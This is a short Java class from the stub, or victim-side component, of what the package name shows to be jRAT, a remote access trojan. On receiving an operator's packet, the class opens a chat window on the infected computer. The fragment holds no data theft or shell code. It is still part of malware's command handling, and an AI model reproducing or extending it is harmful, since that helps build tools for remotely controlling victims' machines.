package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.FrameChat;

public class Packet48ChatStart extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		Connection.instance.setFrameChat(new FrameChat());
		Connection.instance.getFrameChat().setVisible(true);
	}

}
